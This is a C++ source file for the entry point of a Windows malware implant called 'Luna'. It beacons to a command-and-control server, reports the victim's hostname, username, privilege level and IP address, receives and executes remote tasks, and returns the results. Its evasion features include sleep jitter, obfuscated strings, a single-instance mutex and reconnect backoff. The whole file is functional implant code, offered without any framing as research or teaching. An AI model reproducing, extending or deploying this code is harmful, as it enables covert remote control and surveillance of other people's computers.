// Luna implant entry point.
//
// beacon loop: handshake -> poll for tasks -> execute -> queue results -> sleep
// with jitter. Transport failure tears down the session and re-handshakes with
// exponential backoff, so a server restart never strands the agent.
#include "crypto.hpp"
#include "dispatch.hpp"
#include "json.hpp"
#include "luna_config.hpp"
#include "obf.hpp"
#include "platform.hpp"
#include "sysutil.hpp"
#include "transport.hpp"

#include <deque>
#include <string>

namespace {

using namespace luna;

struct QueuedResult {
    std::string id;
    bool ok = false;
    std::string data;
    std::string err;
};

constexpr std::size_t kMaxQueuedResults = 64;

std::string local_ip() {
    SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
    std::string ip = "0.0.0.0";
    if (s != INVALID_SOCKET) {
        sockaddr_in target{};
        target.sin_family = AF_INET;
        target.sin_port = htons(53);
        target.sin_addr.s_addr = inet_addr("1.1.1.1");
        if (::connect(s, reinterpret_cast<sockaddr*>(&target), sizeof(target)) == 0) {
            sockaddr_in name{};
            int len = sizeof(name);
            if (getsockname(s, reinterpret_cast<sockaddr*>(&name), &len) == 0) {
                char buf[INET_ADDRSTRLEN] = {};
                inet_ntop(AF_INET, &name.sin_addr, buf, sizeof(buf));
                ip = buf;
            }
        }
        closesocket(s);
    }
    return ip;
}

Json build_meta(const AgentState& state) {
    const TokenInfo info = token_info();
    Json meta = Json::object();
    meta.set("hostname", Json(computer_name()));
    meta.set("username", Json(info.user));
    meta.set("os", Json(os_version()));
    meta.set("arch", Json(architecture()));
    meta.set("pid", Json(static_cast<std::int64_t>(GetCurrentProcessId())));
    meta.set("ip", Json(local_ip()));
    meta.set("elevated", Json(info.elevated));
    meta.set("integrity", Json(info.integrity));
    meta.set("transport", Json(XLIT(LUNA_TRANSPORT_STR)));
    meta.set("sleep", Json(state.sleep_seconds));
    return meta;
}

void sleep_with_jitter(int seconds, int jitter_percent) {
    int jitter = 0;
    if (jitter_percent > 0) {
        const auto span = (seconds * jitter_percent) / 100;
        if (span > 0) {
            const Bytes r = random_bytes(4);
            const auto v = static_cast<unsigned>(r[0]) << 24 | static_cast<unsigned>(r[1]) << 16 |
                           static_cast<unsigned>(r[2]) << 8 | static_cast<unsigned>(r[3]);
            jitter = static_cast<int>(v % static_cast<unsigned>(span + 1));
            if (r[0] & 1) jitter = -jitter;
        }
    }
    int total = seconds + jitter;
    if (total < 1) total = 1;
    Sleep(static_cast<DWORD>(total) * 1000);
}

int run() {
    WSADATA wsa{};
    WSAStartup(MAKEWORD(2, 2), &wsa);

    const std::string mutex = XLIT(LUNA_MUTEX_STR);
    HANDLE instance = CreateMutexW(nullptr, TRUE, to_wide(mutex).c_str());
    if (!instance || GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;  // another copy is already resident
    }

    AgentState state;
    state.sleep_seconds = LUNA_DEFAULT_SLEEP;
    state.jitter_percent = LUNA_DEFAULT_JITTER;
    state.cwd = "";
    {
        const Result bootstrap = handle_pwd(Json::object(), state);
        if (bootstrap.ok) state.cwd = bootstrap.data;
    }

    auto transport = make_transport();
    std::deque<QueuedResult> pending;
    std::uint64_t seq = 0;
    int backoff = 5;

    for (;;) {
        if (!transport->session_id().empty() && transport->needs_rehandshake()) {
            transport->close();
        }

        if (transport->session_id().empty() || transport->needs_rehandshake()) {
            std::string error;
            if (!transport->open(build_meta(state).dump(), error)) {
                Sleep(static_cast<DWORD>(backoff) * 1000);
                backoff = (backoff * 2 > 300) ? 300 : backoff * 2;
                continue;
            }
            backoff = 5;
        }

        // -- assemble the check-in
        Json request = Json::object();
        request.set("seq", Json(static_cast<std::int64_t>(++seq)));
        request.set("want", Json(4));
        request.set("meta", build_meta(state));

        Json results = Json::array();
        const std::size_t batch = pending.size() > 16 ? 16 : pending.size();
        for (std::size_t i = 0; i < batch; ++i) {
            const QueuedResult& qr = pending.front();
            Json item = Json::object();
            item.set("id", Json(qr.id));
            item.set("ok", Json(qr.ok));
            item.set("data", Json(qr.data));
            item.set("err", Json(qr.err));
            results.push(std::move(item));
            pending.pop_front();
        }
        request.set("results", std::move(results));

        std::string response;
        std::string error;
        if (!transport->beacon(request.dump(), response, error)) {
            transport->close();
            Sleep(static_cast<DWORD>(backoff) * 1000);
            backoff = (backoff * 2 > 300) ? 300 : backoff * 2;
            continue;
        }
        backoff = 5;

        bool parsed = false;
        const Json reply = Json::parse(response, &parsed);
        if (!parsed) {
            transport->close();
            continue;
        }

        if (reply.has("sleep")) {
            const auto s = reply["sleep"].as_int(state.sleep_seconds);
            if (s > 0) state.sleep_seconds = static_cast<int>(s);
        }
        if (reply.has("jitter")) {
            state.jitter_percent = static_cast<int>(reply["jitter"].as_int(state.jitter_percent));
        }
        if (reply["kill"].as_bool(false)) {
            state.shutdown_requested = true;
        }

        for (const Json& task : reply["tasks"].items()) {
            const std::string id = task["id"].as_string();
            const std::string kind = task["kind"].as_string();
            Result result;
            dispatch(kind, task["args"], state, result);

            if (pending.size() >= kMaxQueuedResults) pending.pop_front();
            pending.push_back(QueuedResult{id, result.ok, result.data, result.err});

            if (state.shutdown_requested) {
                // flush the final result set before leaving
                Json farewell = Json::object();
                farewell.set("seq", Json(static_cast<std::int64_t>(++seq)));
                farewell.set("want", Json(0));
                farewell.set("meta", build_meta(state));
                Json tail = Json::array();
                for (const auto& qr : pending) {
                    Json item = Json::object();
                    item.set("id", Json(qr.id));
                    item.set("ok", Json(qr.ok));
                    item.set("data", Json(qr.data));
                    item.set("err", Json(qr.err));
                    tail.push(std::move(item));
                }
                farewell.set("results", std::move(tail));
                std::string ignored;
                std::string flush_error;
                transport->beacon(farewell.dump(), ignored, flush_error);
                transport->close();
                return 0;
            }
        }

        sleep_with_jitter(state.sleep_seconds, state.jitter_percent);
    }
}

}  // namespace

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    return run();
}
